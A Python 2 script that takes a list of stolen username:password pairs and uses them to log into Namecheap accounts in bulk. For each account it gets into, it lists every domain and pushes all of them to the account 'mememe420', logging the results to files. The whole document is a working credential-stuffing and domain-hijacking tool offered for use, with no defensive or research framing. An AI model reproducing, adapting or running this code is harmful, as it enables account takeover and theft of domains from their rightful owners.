# -*- coding: utf-8 -*-
import requests
import re
import Queue
import codecs
import time
from threading import Thread

requests.packages.urllib3.disable_warnings()


def check(q):
    while True:
        try:
            c = q.get()
            user = c.split(':')[0]
            passw = c.split(':')[1]
            work = False
            proxy = {
            }
            s = requests.session()
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36',
                'Origin': 'https://support.namecheap.com',
                'Accept-Encoding': 'gzip'
            }
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            r = s.get(
                        'https://namecheap.com/',
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            data = 'LoginUserName={0}&LoginPassword={1}&hidden_LoginPassword='.format(user, passw)
            r = s.post(
                        'https://www.namecheap.com/myaccount/login.aspx',
                        data,
                        verify=False,
                        headers=headers,
                        proxies=proxy
                    )
            if 'Your account has been locked for' in r.text:
                print user, 'is locked'
                f = open("locked.txt", "a")
                f.write(c + '\n')
                f.close()
            elif 'Last logged in ' in r.text:
                r = s.get(
                            'https://ap.www.namecheap.com/Domains/DomainList',
                            verify=False,
                            headers=headers,
                            proxies=proxy
                        )
                headers['Accept'] = 'application/json, text/plain, */*'
                del headers['Origin']
                headers['_NcCompliance'] = s.cookies.get_dict()['_NcCompliance']
                data = '{"gridStateModel":{"ServerChunkSize":1000,"LastAvailableChunkIndex":0,"IsLazyLoading":true,"TotalServerItemsCount":null},"isOverViewPage":"false"}'
                r = s.post(
                            'https://ap.www.namecheap.com/Domains/GetDomainList',
                            data,
                            verify=False,
                            headers=headers,
                            proxies=proxy
                        )
                domains = re.findall('\[0,"(.*?)"', r.text)
                for domain in domains:
                    data = 'domainname={0}&accountPassword={1}&newDomainOwner=mememe420&isUseDestContact=true'.format(domain, passw)
                    r = s.post(
                            'https://ap.www.namecheap.com/Domains/DomainControlPanel/PushDomain',
                            data,
                            verify=False,
                            headers=headers,
                            proxies=proxy
                        )
                    if '""' in r.text:
                        print domain, 'transfered successfully!'
                        f = open("toaccept.txt", "a")
                        f.write(domain + '\n')
                        f.close()
                    else:
                        print domain, 'not transfered!'
                f = open("donetransfers.txt", "a")
                f.write(c + '\n')
                f.close()
            time.sleep(0.005)
        except Exception, e:
            print e
            raw_input("Please Send Me The Error Message!")
        q.task_done()
    
def main():
    with codecs.open('transfers.txt', 'r', encoding='utf-8') as f:
        users = f.readlines()
        
    queue = Queue.Queue()
    for _ in range(int(2)):
        worker = Thread(target=check, args=(queue,))
        worker.start()
    for user in users:
        queue.put(user.strip().encode('ascii', 'ignore'))
            
if __name__ == '__main__':
    main()
        